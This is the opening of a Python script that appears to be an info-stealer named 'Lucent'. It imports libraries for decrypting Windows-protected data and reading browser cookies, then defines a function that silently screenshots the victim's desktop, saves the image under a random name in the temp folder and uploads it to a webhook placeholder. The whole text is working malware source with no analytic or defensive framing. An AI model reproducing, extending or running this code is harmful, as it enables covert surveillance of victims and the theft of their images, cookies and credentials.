import requests
import socket
import time
import psutil
import string
import platform
import subprocess
import json
import uuid
import json
import shutil
import re
import base64
import random
import sqlite3
import win32crypt 
import datetime
import re
import wmi
import os
import pyautogui
import tempfile
import sys
import browser_cookie3
from Crypto.Cipher import AES
import ctypes

h00k = "webhook"

def gen_filename(length=5):
    safe_chars = string.ascii_letters + string.digits + "_-"
    return ''.join(random.choice(safe_chars) for _ in range(length))

def screenshot():
    temp_dir = tempfile.gettempdir()
    screenshot_filename = gen_filename(16) + ".png" 
    screenshot_path = os.path.join(temp_dir, screenshot_filename)

    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)

    with open(screenshot_path, "rb") as f:
        files = {"file": (screenshot_filename, f, "image/png")}
        data = {
            "username": "Lucent", 
            "content": f"📸 Screenshot",
            "avatar_url": "https://i.pinimg.com/736x/c9/34/d6/c934d6c71c98ae4f38c7c68038634594.jpg",  
        }
        response3 = requests.post(h00k, data=data, files=files)
    
    if response3.status_code == 204:
        print ("Check it %temp%")
    else:
        pass
